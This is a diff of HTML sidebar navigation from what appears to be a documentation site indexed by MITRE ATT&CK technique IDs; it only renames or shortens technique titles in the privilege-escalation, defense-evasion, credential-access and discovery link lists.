    <li class="toctree-l2">
     <a class="reference internal" href="../privilege-escalation/T1547.009.html">
-     T1547.009 - Boot or Logon Autostart Execution: Shortcut Modification
+     T1547.009 - Shortcut Modification
     </a>
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../privilege-escalation/T1547.010.html">
-     T1547.010 - Boot or Logon Autostart Execution: Port Monitors
+     T1547.010 - Port Monitors
     </a>
    </li>
    <li class="toctree-l2">
@@ -1917,7 +1917,7 @@ const thebe_selector_output = ".output, .cell_output"
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../privilege-escalation/T1547.015.html">
-     T1547.015 - Boot or Logon Autostart Execution: Login Items
+     T1547.015 - Login Items
     </a>
    </li>
    <li class="toctree-l2">
@@ -1927,17 +1927,17 @@ const thebe_selector_output = ".output, .cell_output"
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../privilege-escalation/T1548.001.html">
-     T1548.001 - Abuse Elevation Control Mechanism: Setuid and Setgid
+     T1548.001 - Setuid and Setgid
     </a>
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../privilege-escalation/T1548.002.html">
-     T1548.002 - Abuse Elevation Control Mechanism: Bypass User Account Control
+     T1548.002 - Bypass User Account Control
     </a>
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../privilege-escalation/T1548.003.html">
-     T1548.003 - Abuse Elevation Control Mechanism: Sudo and Sudo Caching
+     T1548.003 - Sudo and Sudo Caching
     </a>
    </li>
    <li class="toctree-l2">
@@ -1952,12 +1952,12 @@ const thebe_selector_output = ".output, .cell_output"
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../privilege-escalation/T1574.001.html">
-     T1574.001 - Hijack Execution Flow: DLL Search Order Hijacking
+     T1574.001 - DLL Search Order Hijacking
     </a>
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../privilege-escalation/T1574.002.html">
-     T1574.002 - Hijack Execution Flow: DLL Side-Loading
+     T1574.002 - DLL Side-Loading
     </a>
    </li>
    <li class="toctree-l2">
@@ -1972,7 +1972,7 @@ const thebe_selector_output = ".output, .cell_output"
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../privilege-escalation/T1574.006.html">
-     T1574.006 - Hijack Execution Flow: LD_PRELOAD
+     T1574.006 - Dynamic Linker Hijacking
     </a>
    </li>
    <li class="toctree-l2">
@@ -1982,12 +1982,12 @@ const thebe_selector_output = ".output, .cell_output"
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../privilege-escalation/T1574.008.html">
-     T1574.008 - Hijack Execution Flow: Path Interception by Search Order Hijacking
+     T1574.008 - Path Interception by Search Order Hijacking
     </a>
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../privilege-escalation/T1574.009.html">
-     T1574.009 - Hijack Execution Flow: Path Interception by Unquoted Path
+     T1574.009 - Path Interception by Unquoted Path
     </a>
    </li>
    <li class="toctree-l2">
@@ -1997,12 +1997,12 @@ const thebe_selector_output = ".output, .cell_output"
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../privilege-escalation/T1574.011.html">
-     T1574.011 - Hijack Execution Flow: Services Registry Permissions Weakness
+     T1574.011 - Services Registry Permissions Weakness
     </a>
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../privilege-escalation/T1574.012.html">
-     T1574.012 - Hijack Execution Flow: COR_PROFILER
+     T1574.012 - COR_PROFILER
     </a>
    </li>
    <li class="toctree-l2">
@@ -2049,12 +2049,12 @@ const thebe_selector_output = ".output, .cell_output"
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../defense-evasion/T1027.001.html">
-     T1027.001 - Obfuscated Files or Information: Binary Padding
+     T1027.001 - Binary Padding
     </a>
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../defense-evasion/T1027.002.html">
-     T1027.002 - Obfuscated Files or Information: Software Packing
+     T1027.002 - Software Packing
     </a>
    </li>
    <li class="toctree-l2">
@@ -2064,7 +2064,7 @@ const thebe_selector_output = ".output, .cell_output"
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../defense-evasion/T1027.004.html">
-     T1027.004 - Obfuscated Files or Information: Compile After Delivery
+     T1027.004 - Compile After Delivery
     </a>
    </li>
    <li class="toctree-l2">
@@ -2109,22 +2109,22 @@ const thebe_selector_output = ".output, .cell_output"
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../defense-evasion/T1036.003.html">
-     T1036.003 - Masquerading: Rename System Utilities
+     T1036.003 - Rename System Utilities
     </a>
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../defense-evasion/T1036.004.html">
-     T1036.004 - Masquerading: Masquerade Task or Service
+     T1036.004 - Masquerade Task or Service
     </a>
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../defense-evasion/T1036.005.html">
-     T1036.005 - Masquerading: Match Legitimate Name or Location
+     T1036.005 - Match Legitimate Name or Location
     </a>
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../defense-evasion/T1036.006.html">
-     T1036.006 - Masquerading: Space after Filename
+     T1036.006 - Space after Filename
     </a>
    </li>
    <li class="toctree-l2">
@@ -2154,7 +2154,7 @@ const thebe_selector_output = ".output, .cell_output"
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../defense-evasion/T1055.001.html">
-     T1055.001 - Process Injection: Dynamic-link Library Injection
+     T1055.001 - Dynamic-link Library Injection
     </a>
    </li>
    <li class="toctree-l2">
@@ -2169,7 +2169,7 @@ const thebe_selector_output = ".output, .cell_output"
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../defense-evasion/T1055.004.html">
-     T1055.004 - Process Injection: Asynchronous Procedure Call
+     T1055.004 - Asynchronous Procedure Call
     </a>
    </li>
    <li class="toctree-l2">
@@ -2194,7 +2194,7 @@ const thebe_selector_output = ".output, .cell_output"
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../defense-evasion/T1055.012.html">
-     T1055.012 - Process Injection: Process Hollowing
+     T1055.012 - Process Hollowing
     </a>
    </li>
    <li class="toctree-l2">
@@ -2229,32 +2229,32 @@ const thebe_selector_output = ".output, .cell_output"
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../defense-evasion/T1070.001.html">
-     T1070.001 - Indicator Removal on Host: Clear Windows Event Logs
+     T1070.001 - Clear Windows Event Logs
     </a>
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../defense-evasion/T1070.002.html">
-     T1070.002 - Indicator Removal on Host: Clear Linux or Mac System Logs
+     T1070.002 - Clear Linux or Mac System Logs
     </a>
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../defense-evasion/T1070.003.html">
-     T1070.003 - Indicator Removal on Host: Clear Command History
+     T1070.003 - Clear Command History
     </a>
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../defense-evasion/T1070.004.html">
-     T1070.004 - Indicator Removal on Host: File Deletion
+     T1070.004 - File Deletion
     </a>
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../defense-evasion/T1070.005.html">
-     T1070.005 - Indicator Removal on Host: Network Share Connection Removal
+     T1070.005 - Network Share Connection Removal
     </a>
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../defense-evasion/T1070.006.html">
-     T1070.006 - Indicator Removal on Host: Timestomp
+     T1070.006 - Timestomp
     </a>
    </li>
    <li class="toctree-l2">
@@ -2274,7 +2274,7 @@ const thebe_selector_output = ".output, .cell_output"
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../defense-evasion/T1070.html">
-     T1070 - Indicator Removal on Host
+     T1070 - Indicator Removal
     </a>
    </li>
    <li class="toctree-l2">
@@ -2284,7 +2284,7 @@ const thebe_selector_output = ".output, .cell_output"
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../defense-evasion/T1078.001.html">
-     T1078.001 - Valid Accounts: Default Accounts
+     T1078.001 - Default Accounts
     </a>
    </li>
    <li class="toctree-l2">
@@ -2294,12 +2294,12 @@ const thebe_selector_output = ".output, .cell_output"
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../defense-evasion/T1078.003.html">
-     T1078.003 - Valid Accounts: Local Accounts
+     T1078.003 - Local Accounts
     </a>
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../defense-evasion/T1078.004.html">
-     T1078.004 - Valid Accounts: Cloud Accounts
+     T1078.004 - Cloud Accounts
     </a>
    </li>
    <li class="toctree-l2">
@@ -2389,7 +2389,7 @@ const thebe_selector_output = ".output, .cell_output"
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../defense-evasion/T1127.001.html">
-     T1127.001 - Trusted Developer Utilities Proxy Execution: MSBuild
+     T1127.001 - MSBuild
     </a>
    </li>
    <li class="toctree-l2">
@@ -2404,7 +2404,7 @@ const thebe_selector_output = ".output, .cell_output"
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../defense-evasion/T1134.001.html">
-     T1134.001 - Access Token Manipulation: Token Impersonation/Theft
+     T1134.001 - Token Impersonation/Theft
     </a>
    </li>
    <li class="toctree-l2">
@@ -2419,12 +2419,12 @@ const thebe_selector_output = ".output, .cell_output"
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../defense-evasion/T1134.004.html">
-     T1134.004 - Access Token Manipulation: Parent PID Spoofing
+     T1134.004 - Parent PID Spoofing
     </a>
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../defense-evasion/T1134.005.html">
-     T1134.005 - Access Token Manipulation: SID-History Injection
+     T1134.005 - SID-History Injection
     </a>
    </li>
    <li class="toctree-l2">
@@ -2559,62 +2559,62 @@ const thebe_selector_output = ".output, .cell_output"
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../defense-evasion/T1216.001.html">
-     T1216.001 - Signed Script Proxy Execution: Pubprn
+     T1216.001 - PubPrn
     </a>
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../defense-evasion/T1216.html">
-     T1216 - Signed Script Proxy Execution
+     T1216 - System Script Proxy Execution
     </a>
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../defense-evasion/T1218.001.html">
-     T1218.001 - Signed Binary Proxy Execution: Compiled HTML File
+     T1218.001 - Compiled HTML File
     </a>
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../defense-evasion/T1218.002.html">
-     T1218.002 - Signed Binary Proxy Execution: Control Panel
+     T1218.002 - Control Panel
     </a>
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../defense-evasion/T1218.003.html">
-     T1218.003 - Signed Binary Proxy Execution: CMSTP
+     T1218.003 - CMSTP
     </a>
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../defense-evasion/T1218.004.html">
-     T1218.004 - Signed Binary Proxy Execution: InstallUtil
+     T1218.004 - InstallUtil
     </a>
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../defense-evasion/T1218.005.html">
-     T1218.005 - Signed Binary Proxy Execution: Mshta
+     T1218.005 - Mshta
     </a>
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../defense-evasion/T1218.007.html">
-     T1218.007 - Signed Binary Proxy Execution: Msiexec
+     T1218.007 - Msiexec
     </a>
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../defense-evasion/T1218.008.html">
-     T1218.008 - Signed Binary Proxy Execution: Odbcconf
+     T1218.008 - Odbcconf
     </a>
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../defense-evasion/T1218.009.html">
-     T1218.009 - Signed Binary Proxy Execution: Regsvcs/Regasm
+     T1218.009 - Regsvcs/Regasm
     </a>
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../defense-evasion/T1218.010.html">
-     T1218.010 - Signed Binary Proxy Execution: Regsvr32
+     T1218.010 - Regsvr32
     </a>
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../defense-evasion/T1218.011.html">
-     T1218.011 - Signed Binary Proxy Execution: Rundll32
+     T1218.011 - Rundll32
     </a>
    </li>
    <li class="toctree-l2">
@@ -2634,7 +2634,7 @@ const thebe_selector_output = ".output, .cell_output"
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../defense-evasion/T1218.html">
-     T1218 - Signed Binary Proxy Execution
+     T1218 - System Binary Proxy Execution
     </a>
    </li>
    <li class="toctree-l2">
@@ -2649,12 +2649,12 @@ const thebe_selector_output = ".output, .cell_output"
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../defense-evasion/T1222.001.html">
-     T1222.001 - File and Directory Permissions Modification: Windows File and Directory Permissions Modification
+     T1222.001 - Windows File and Directory Permissions Modification
     </a>
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../defense-evasion/T1222.002.html">
-     T1222.002 - File and Directory Permissions Modification: Linux and Mac File and Directory Permissions Modification
+     T1222.002 - Linux and Mac File and Directory Permissions Modification
     </a>
    </li>
    <li class="toctree-l2">
@@ -2679,7 +2679,7 @@ const thebe_selector_output = ".output, .cell_output"
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../defense-evasion/T1484.001.html">
-     T1484.001 - Domain Policy Modification: Group Policy Modification
+     T1484.001 - Group Policy Modification
     </a>
    </li>
    <li class="toctree-l2">
@@ -2694,7 +2694,7 @@ const thebe_selector_output = ".output, .cell_output"
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../defense-evasion/T1497.001.html">
-     T1497.001 - Virtualization/Sandbox Evasion: System Checks
+     T1497.001 - System Checks
     </a>
    </li>
    <li class="toctree-l2">
@@ -2774,17 +2774,17 @@ const thebe_selector_output = ".output, .cell_output"
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../defense-evasion/T1548.001.html">
-     T1548.001 - Abuse Elevation Control Mechanism: Setuid and Setgid
+     T1548.001 - Setuid and Setgid
     </a>
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../defense-evasion/T1548.002.html">
-     T1548.002 - Abuse Elevation Control Mechanism: Bypass User Account Control
+     T1548.002 - Bypass User Account Control
     </a>
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../defense-evasion/T1548.003.html">
-     T1548.003 - Abuse Elevation Control Mechanism: Sudo and Sudo Caching
+     T1548.003 - Sudo and Sudo Caching
     </a>
    </li>
    <li class="toctree-l2">
@@ -2804,12 +2804,12 @@ const thebe_selector_output = ".output, .cell_output"
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../defense-evasion/T1550.002.html">
-     T1550.002 - Use Alternate Authentication Material: Pass the Hash
+     T1550.002 - Pass the Hash
     </a>
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../defense-evasion/T1550.003.html">
-     T1550.003 - Use Alternate Authentication Material: Pass the Ticket
+     T1550.003 - Pass the Ticket
     </a>
    </li>
    <li class="toctree-l2">
@@ -2824,7 +2824,7 @@ const thebe_selector_output = ".output, .cell_output"
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../defense-evasion/T1553.001.html">
-     T1553.001 - Subvert Trust Controls: Gatekeeper Bypass
+     T1553.001 - Gatekeeper Bypass
     </a>
    </li>
    <li class="toctree-l2">
@@ -2839,12 +2839,12 @@ const thebe_selector_output = ".output, .cell_output"
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../defense-evasion/T1553.004.html">
-     T1553.004 - Subvert Trust Controls: Install Root Certificate
+     T1553.004 - Install Root Certificate
     </a>
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../defense-evasion/T1553.005.html">
-     T1553.005 - Subvert Trust Controls: Mark-of-the-Web Bypass
+     T1553.005 - Mark-of-the-Web Bypass
     </a>
    </li>
    <li class="toctree-l2">
@@ -2864,12 +2864,12 @@ const thebe_selector_output = ".output, .cell_output"
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../defense-evasion/T1556.002.html">
-     T1556.002 - Modify Authentication Process: Password Filter DLL
+     T1556.002 - Password Filter DLL
     </a>
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../defense-evasion/T1556.003.html">
-     T1556.003 - Modify Authentication Process: Pluggable Authentication Modules
+     T1556.003 - Pluggable Authentication Modules
     </a>
    </li>
    <li class="toctree-l2">
@@ -2899,27 +2899,27 @@ const thebe_selector_output = ".output, .cell_output"
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../defense-evasion/T1562.001.html">
-     T1562.001 - Impair Defenses: Disable or Modify Tools
+     T1562.001 - Disable or Modify Tools
     </a>
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../defense-evasion/T1562.002.html">
-     T1562.002 - Impair Defenses: Disable Windows Event Logging
+     T1562.002 - Disable Windows Event Logging
     </a>
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../defense-evasion/T1562.003.html">
-     T1562.003 - Impair Defenses: HISTCONTROL
+     T1562.003 - Impair Command History Logging
     </a>
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../defense-evasion/T1562.004.html">
-     T1562.004 - Impair Defenses: Disable or Modify System Firewall
+     T1562.004 - Disable or Modify System Firewall
     </a>
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../defense-evasion/T1562.006.html">
-     T1562.006 - Impair Defenses: Indicator Blocking
+     T1562.006 - Indicator Blocking
     </a>
    </li>
    <li class="toctree-l2">
@@ -2929,7 +2929,7 @@ const thebe_selector_output = ".output, .cell_output"
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../defense-evasion/T1562.008.html">
-     T1562.008 - Impair Defenses: Disable Cloud Logs
+     T1562.008 - Disable Cloud Logs
     </a>
    </li>
    <li class="toctree-l2">
@@ -2949,22 +2949,22 @@ const thebe_selector_output = ".output, .cell_output"
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../defense-evasion/T1564.001.html">
-     T1564.001 - Hide Artifacts: Hidden Files and Directories
+     T1564.001 - Hidden Files and Directories
     </a>
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../defense-evasion/T1564.002.html">
-     T1564.002 - Hide Artifacts: Hidden Users
+     T1564.002 - Hidden Users
     </a>
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../defense-evasion/T1564.003.html">
-     T1564.003 - Hide Artifacts: Hidden Window
+     T1564.003 - Hidden Window
     </a>
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../defense-evasion/T1564.004.html">
-     T1564.004 - Hide Artifacts: NTFS File Attributes
+     T1564.004 - NTFS File Attributes
     </a>
    </li>
    <li class="toctree-l2">
@@ -3004,12 +3004,12 @@ const thebe_selector_output = ".output, .cell_output"
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../defense-evasion/T1574.001.html">
-     T1574.001 - Hijack Execution Flow: DLL Search Order Hijacking
+     T1574.001 - DLL Search Order Hijacking
     </a>
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../defense-evasion/T1574.002.html">
-     T1574.002 - Hijack Execution Flow: DLL Side-Loading
+     T1574.002 - DLL Side-Loading
     </a>
    </li>
    <li class="toctree-l2">
@@ -3024,7 +3024,7 @@ const thebe_selector_output = ".output, .cell_output"
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../defense-evasion/T1574.006.html">
-     T1574.006 - Hijack Execution Flow: LD_PRELOAD
+     T1574.006 - Dynamic Linker Hijacking
     </a>
    </li>
    <li class="toctree-l2">
@@ -3034,12 +3034,12 @@ const thebe_selector_output = ".output, .cell_output"
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../defense-evasion/T1574.008.html">
-     T1574.008 - Hijack Execution Flow: Path Interception by Search Order Hijacking
+     T1574.008 - Path Interception by Search Order Hijacking
     </a>
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../defense-evasion/T1574.009.html">
-     T1574.009 - Hijack Execution Flow: Path Interception by Unquoted Path
+     T1574.009 - Path Interception by Unquoted Path
     </a>
    </li>
    <li class="toctree-l2">
@@ -3049,12 +3049,12 @@ const thebe_selector_output = ".output, .cell_output"
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../defense-evasion/T1574.011.html">
-     T1574.011 - Hijack Execution Flow: Services Registry Permissions Weakness
+     T1574.011 - Services Registry Permissions Weakness
     </a>
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../defense-evasion/T1574.012.html">
-     T1574.012 - Hijack Execution Flow: COR_PROFILER
+     T1574.012 - COR_PROFILER
     </a>
    </li>
    <li class="toctree-l2">
@@ -3134,7 +3134,7 @@ const thebe_selector_output = ".output, .cell_output"
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../defense-evasion/T1610.html">
-     T1610 - Deploy a container
+     T1610 - Deploy Container
     </a>
    </li>
    <li class="toctree-l2">
@@ -3171,42 +3171,42 @@ const thebe_selector_output = ".output, .cell_output"
   <ul class="current">
    <li class="toctree-l2 current active">
     <a class="current reference internal" href="#">
-     T1003.001 - OS Credential Dumping: LSASS Memory
+     T1003.001 - LSASS Memory
     </a>
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="T1003.002.html">
-     T1003.002 - OS Credential Dumping: Security Account Manager
+     T1003.002 - Security Account Manager
     </a>
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="T1003.003.html">
-     T1003.003 - OS Credential Dumping: NTDS
+     T1003.003 - NTDS
     </a>
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="T1003.004.html">
-     T1003.004 - OS Credential Dumping: LSA Secrets
+     T1003.004 - LSA Secrets
     </a>
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="T1003.005.html">
-     T1003.005 - OS Credential Dumping: Cached Domain Credentials
+     T1003.005 - Cached Domain Credentials
     </a>
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="T1003.006.html">
-     T1003.006 - OS Credential Dumping: DCSync
+     T1003.006 - DCSync
     </a>
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="T1003.007.html">
-     T1003.007 - OS Credential Dumping: Proc Filesystem
+     T1003.007 - Proc Filesystem
     </a>
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="T1003.008.html">
-     T1003.008 - OS Credential Dumping: /etc/passwd and /etc/shadow
+     T1003.008 - /etc/passwd and /etc/shadow
     </a>
    </li>
    <li class="toctree-l2">
@@ -3221,12 +3221,12 @@ const thebe_selector_output = ".output, .cell_output"
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="T1056.001.html">
-     T1056.001 - Input Capture: Keylogging
+     T1056.001 - Keylogging
     </a>
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="T1056.002.html">
-     T1056.002 - Input Capture: GUI Input Capture
+     T1056.002 - GUI Input Capture
     </a>
    </li>
    <li class="toctree-l2">
@@ -3236,7 +3236,7 @@ const thebe_selector_output = ".output, .cell_output"
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="T1056.004.html">
-     T1056.004 - Input Capture: Credential API Hooking
+     T1056.004 - Credential API Hooking
     </a>
    </li>
    <li class="toctree-l2">
@@ -3251,22 +3251,22 @@ const thebe_selector_output = ".output, .cell_output"
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="T1110.001.html">
-     T1110.001 - Brute Force: Password Guessing
+     T1110.001 - Password Guessing
     </a>
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="T1110.002.html">
-     T1110.002 - Brute Force: Password Cracking
+     T1110.002 - Password Cracking
     </a>
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="T1110.003.html">
-     T1110.003 - Brute Force: Password Spraying
+     T1110.003 - Password Spraying
     </a>
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="T1110.004.html">
-     T1110.004 - Brute Force: Credential Stuffing
+     T1110.004 - Credential Stuffing
     </a>
    </li>
    <li class="toctree-l2">
@@ -3361,37 +3361,37 @@ const thebe_selector_output = ".output, .cell_output"
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="T1552.001.html">
-     T1552.001 - Unsecured Credentials: Credentials In Files
+     T1552.001 - Credentials In Files
     </a>
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="T1552.002.html">
-     T1552.002 - Unsecured Credentials: Credentials in Registry
+     T1552.002 - Credentials in Registry
     </a>
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="T1552.003.html">
-     T1552.003 - Unsecured Credentials: Bash History
+     T1552.003 - Bash History
     </a>
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="T1552.004.html">
-     T1552.004 - Unsecured Credentials: Private Keys
+     T1552.004 - Private Keys
     </a>
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="T1552.005.html">
-     T1552.005 - Unsecured Credentials: Cloud Instance Metadata API
+     T1552.005 - Cloud Instance Metadata API
     </a>
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="T1552.006.html">
-     T1552.006 - Unsecured Credentials: Group Policy Preferences
+     T1552.006 - Group Policy Preferences
     </a>
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="T1552.007.html">
-     T1552.007 - Kubernetes List Secrets
+     T1552.007 - Container API
     </a>
    </li>
    <li class="toctree-l2">
@@ -3401,7 +3401,7 @@ const thebe_selector_output = ".output, .cell_output"
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="T1555.001.html">
-     T1555.001 - Credentials from Password Stores: Keychain
+     T1555.001 - Keychain
     </a>
    </li>
    <li class="toctree-l2">
@@ -3411,12 +3411,12 @@ const thebe_selector_output = ".output, .cell_output"
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="T1555.003.html">
-     T1555.003 - Credentials from Password Stores: Credentials from Web Browsers
+     T1555.003 - Credentials from Web Browsers
     </a>
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="T1555.004.html">
-     T1555.004 - Credentials from Password Stores: Windows Credential Manager
+     T1555.004 - Windows Credential Manager
     </a>
    </li>
    <li class="toctree-l2">
@@ -3436,12 +3436,12 @@ const thebe_selector_output = ".output, .cell_output"
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="T1556.002.html">
-     T1556.002 - Modify Authentication Process: Password Filter DLL
+     T1556.002 - Password Filter DLL
     </a>
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="T1556.003.html">
-     T1556.003 - Modify Authentication Process: Pluggable Authentication Modules
+     T1556.003 - Pluggable Authentication Modules
     </a>
    </li>
    <li class="toctree-l2">
@@ -3471,7 +3471,7 @@ const thebe_selector_output = ".output, .cell_output"
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="T1557.001.html">
-     T1557.001 - Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay
+     T1557.001 - LLMNR/NBT-NS Poisoning and SMB Relay
     </a>
    </li>
    <li class="toctree-l2">
@@ -3491,22 +3491,22 @@ const thebe_selector_output = ".output, .cell_output"
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="T1558.001.html">
-     T1558.001 - Steal or Forge Kerberos Tickets: Golden Ticket
+     T1558.001 - Golden Ticket
     </a>
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="T1558.002.html">
-     T1558.002 - Steal or Forge Kerberos Tickets: Silver Ticket
+     T1558.002 - Silver Ticket
     </a>
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="T1558.003.html">
-     T1558.003 - Steal or Forge Kerberos Tickets: Kerberoasting
+     T1558.003 - Kerberoasting
     </a>
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="T1558.004.html">
-     T1558.004 - Steal or Forge Kerberos Tickets: AS-REP Roasting
+     T1558.004 - AS-REP Roasting
     </a>
    </li>
    <li class="toctree-l2">
@@ -3521,7 +3521,7 @@ const thebe_selector_output = ".output, .cell_output"
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="T1606.002.html">
-     T1606.002 - Forge Web Credentials: SAML token
+     T1606.002 - SAML Tokens
     </a>
    </li>
    <li class="toctree-l2">
@@ -3593,7 +3593,7 @@ const thebe_selector_output = ".output, .cell_output"
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../discovery/T1046.html">
-     T1046 - Network Service Scanning
+     T1046 - Network Service Discovery
     </a>
    </li>
    <li class="toctree-l2">
@@ -3613,12 +3613,12 @@ const thebe_selector_output = ".output, .cell_output"
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../discovery/T1069.001.html">
-     T1069.001 - Permission Groups Discovery: Local Groups
+     T1069.001 - Local Groups
     </a>
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../discovery/T1069.002.html">
-     T1069.002 - Permission Groups Discovery: Domain Groups
+     T1069.002 - Domain Groups
     </a>
    </li>
    <li class="toctree-l2">
@@ -3643,12 +3643,12 @@ const thebe_selector_output = ".output, .cell_output"
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../discovery/T1087.001.html">
-     T1087.001 - Account Discovery: Local Account
+     T1087.001 - Local Account
     </a>
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../discovery/T1087.002.html">
-     T1087.002 - Account Discovery: Domain Account
+     T1087.002 - Domain Account
     </a>
    </li>
    <li class="toctree-l2">
@@ -3698,7 +3698,7 @@ const thebe_selector_output = ".output, .cell_output"
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../discovery/T1497.001.html">
-     T1497.001 - Virtualization/Sandbox Evasion: System Checks
+     T1497.001 - System Checks
     </a>
    </li>
    <li class="toctree-l2">
@@ -3718,7 +3718,7 @@ const thebe_selector_output = ".output, .cell_output"
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../discovery/T1518.001.html">
-     T1518.001 - Software Discovery: Security Software Discovery
+     T1518.001 - Security Software Discovery
     </a>
    </li>
    <li class="toctree-l2">
@@ -3748,7 +3748,7 @@ const thebe_selector_output = ".output, .cell_output"
    </li>
    <li class="toctree-l2">
     <a class="reference internal" href="../discovery/T1614.001.html">
-     T1614.001 - System Location Discovery: System Language Discovery
+     T1614.001 - System Language Discovery
     </a>
